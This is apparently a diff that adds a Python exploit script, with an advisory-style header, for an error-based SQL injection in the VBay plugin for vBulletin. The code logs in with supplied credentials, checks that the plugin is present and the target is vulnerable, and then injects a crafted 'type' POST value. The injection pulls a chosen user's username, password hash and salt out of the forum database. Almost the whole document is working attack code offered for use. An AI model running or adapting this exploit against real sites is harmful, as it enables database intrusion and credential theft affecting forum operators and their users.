@@ -1,0 +1,253 @@
+#!/usr/bin/env python -W ignore::DeprecationWarning
+ 
+"""
+ 
+   VBay <= 1.1.9 - Remote Error based SQL Injection
+   
+                        ~ Author:  Dan UK
+                        ~ Contact: http://www.hackforums.net/member.php?action=profile&uid=817599
+                        ~ Date:    10/11/12
+         
+           DETAILS
+           Among a couple of other unsanitized parameters used within an INSERT INTO statement
+           on line 424-460 of /upload/vbay.php, the "type" variable can be used to exploit this
+           using error based sql injection, making it possible to grab anything the user wants
+           from the vbulletin database (and any others if accessible).
+   
+           As said above, the affected file is /upload/vbay.php.
+           On line 418, we can see the $vbulletin->input variable "type"
+           being assigned with the datatype NO_HTML. Using this data type
+           allows malicious attacks to still be executed.
+   
+           At line 448, it is used within the insert into statement,
+           without any sanitization.
+   
+         
+           POC
+           - You will need to register an account.
+           - Go to [site]/vbay.php?do=postauction.
+           - Modify your post data using a tool such as live http headers, or setting it directly
+             using a tool such as curl/wget to grab the source.
+           - Set the value of "type=" to something that will cause an error, such as a single tick.
+             Example: POST type='
+           - If, when you view the source, you get a vbulletin error message surrounded within
+             comments, then it's possible to go ahead. If not, blind is the way forward.
+   
+           If error based is possible for you, you could either just simply look at some tutorials
+           and go from there, or run the script below which will grab the details for the user specified.
+   
+           Have fun.
+ 
+"""
+ 
+from optparse import OptionParser, OptionGroup
+from argparse import OPTIONAL
+import cookielib, urllib, urllib2, httplib
+import sys, md5, urlparse, re
+ 
+"""
+OPTION PARSER/USAGE
+"""
+usage = "./%prog [options]\n"
+usage += "-h or --help for more help."
+ 
+# Required options
+parser = OptionParser(usage=usage)
+parser.add_option("-u", dest="username",
+                  help="Working username to the target forum.")
+parser.add_option("-p", dest="password",
+                  help="Working password to the target forum.")
+parser.add_option("--host", dest="forumpath",
+                  help="FULL path to the vbulletin forum.")
+ 
+# Optional Options
+optional = OptionGroup(parser, "Optional arguments")
+optional.add_option("-f", dest="userid",
+                    help="User ID to grab. Default is 1.", metavar="USERID",
+                    default="1")
+optional.add_option("-s", dest="prefix",
+                    help="Set the prefix of the vBulletin forum\
+                         Default is null.", default="")
+optional.add_option("-g", "--grab-prefix", dest="grabprefix",
+                    help="Grab the tables prefix.", default=False,
+                    action="store_true")
+ 
+parser.add_option_group(optional)
+ 
+(options, args) = parser.parse_args()
+ 
+if not options.forumpath:
+    parser.error('[-] No forum path given.')
+if not options.username:
+    parser.error('[-] No username given.')
+if not options.password:
+    parser.error('[-] No password given.')
+ 
+ 
+"""
+HEADER
+"""
+def Header():
+    header = """
+# # # # # # # # # # # # # # # # # #
+# VBay <=1.1.9 SQL Injection 0day #
+#            By Dan_UK            #
+# # # # # # # # # # # # # # # # # #\n"""
+    return header
+ 
+"""
+LOGIN AND EXTRACT NEEDED COOKIES
+"""
+def loginForum(forum, username, password):
+    md5pass = md5.md5(password).hexdigest()
+    postdata = urllib.urlencode({
+                'do':'login',
+                'vb_login_md5password':md5pass,
+                'vb_login_username':username,
+                'cookieuser':'1'
+               })
+    cookie_jar = cookielib.CookieJar()
+    handeler = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
+    handeler.open(forum + "login.php?do=login", postdata)
+   
+    for cookie in cookie_jar:
+        if "bbsessionhash" in str(cookie):
+            return cookie_jar
+ 
+ 
+"""
+CHECK VBAY EXISTS
+"""
+def get_server_status_code(forum):
+    host, path = urlparse.urlparse(forum)[1:3]
+    try:
+        conn = httplib.HTTPConnection(host)
+        conn.request('HEAD', path)
+        return conn.getresponse().status
+    except StandardError:
+        return None
+ 
+def checkExists(forum):
+    good_codes = [httplib.OK, httplib.FOUND, httplib.MOVED_PERMANENTLY]
+    return get_server_status_code(forum + "vbay.php") in good_codes
+ 
+"""
+CHECK DEBUG MODE ENABLED
+"""
+def checkVuln(forum, cookie_jar):
+    payload = {
+               "POST":
+                      urllib.urlencode({"type":"'"}),
+               "SCRIPT":"vbay.php?do=postauction"
+              }
+    try:
+        handeler = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
+        resp = handeler.open(forum + payload["SCRIPT"], payload["POST"])
+    except urllib2.HTTPError as e:
+        e_mesg = e.read()
+       
+    if "MySQL Error" in e_mesg:
+        return True
+ 
+"""
+GRAB PREFIX
+"""
+def grabPrefix(forum, cookie_jar):
+    payload = {
+               "SQL":urllib.urlencode({"type":"'"}),
+               "SCRIPT":"vbay.php?do=postauction"
+              }
+   
+    try:
+        handler = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
+        resp = handler.open(forum + payload["SCRIPT"], payload["SQL"])
+    except urllib2.HTTPError as e:
+        e_mesg = e.read()
+   
+    prefix = re.search('INTO(.*)vbay_items', e_mesg).group(1)
+    return prefix
+       
+   
+ 
+"""
+GRAB INFO
+"""
+def grabInfo(forum, cookie_jar, prefix, userid):
+    # 0x2564656c696d312125 = "%delim1!%"
+    payload = {
+                "SQL":
+                      urllib.urlencode({
+                       "type":"' and (select 1 from (select count(*),concat((select(select concat(cast(concat(0x2564656c696d312125,COL_NAME,0x2564656c696d312125) as char),0x7e)) from " + str(prefix) + "user WHERE userid=" + str(userid) + " limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ''='",
+                      }),
+               "COLS": ["username", "password", "salt"],
+               "SCRIPT":"vbay.php?do=postauction"
+              }
+   
+    info = []
+    for col in payload["COLS"]:
+        print "[!] Grabbing the %s" % col
+        try:
+            handler = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
+            resp = handler.open(forum + payload["SCRIPT"], payload["SQL"].replace("COL_NAME", col))
+        except urllib2.HTTPError as e:
+            e_mesg = e.read()
+            info.append(e_mesg.split("%delim1!%")[1].strip("\n"))
+    return info
+   
+   
+"""
+MAIN
+"""
+def main():
+     username = options.username
+     password = options.password
+     forum = options.forumpath
+     userid = options.userid
+     prefix = options.prefix
+     
+     if forum.lower()[:7] != "http://":
+         if forum.lower()[:8] == "https://":
+             forum = forum.replace("https://", "http://")
+     if forum[-1:] != "/":
+         forum = forum + "/"
+             
+     print Header()
+     
+     print "[!] Trying to login to: " + forum
+     if loginForum(forum, username, password):
+         cookies = loginForum(forum, username, password)
+         print "[+] Login works."
+     else:
+         print "[-] Login doesn't work. (" + username + ":" + password + ")"
+         print "[-] Exiting."
+         sys.exit()
+         
+     print "\n[!] Checking if vBay is installed.."
+     if (checkExists(forum)):
+         print "[+] vBay was found. Continuing with exploit."
+     else:
+         print "[-] vBay could no be found. (" + forum + "/vbay.php)"
+         print "[-] Exiting."
+         sys.exit()
+         
+     print "\n[!] Checking if debug mode is enabled.."
+     if checkVuln(forum, cookies):
+         print "[+] Debug mode is enabled, exploit is possible."
+         
+     if options.grabprefix == True:
+         print "\n[!] Grabbing prefix."
+         print "[+] Prefix found:" + grabPrefix(forum, cookies)    
+         sys.exit()
+         
+         
+     print "\n[!] Grabbing info.\n"
+     info = grabInfo(forum, cookies, prefix, userid)
+     print "\n[+] Formatting for ease of view."
+     print "\n\n[+] Username: " + info[0]
+     print "[+] Password: " + info[1]
+     print "[+] Salt: " + info[2]
+     print "\n\nThanks for using my tool."
+         
+     
+if __name__ == "__main__":
+    main()
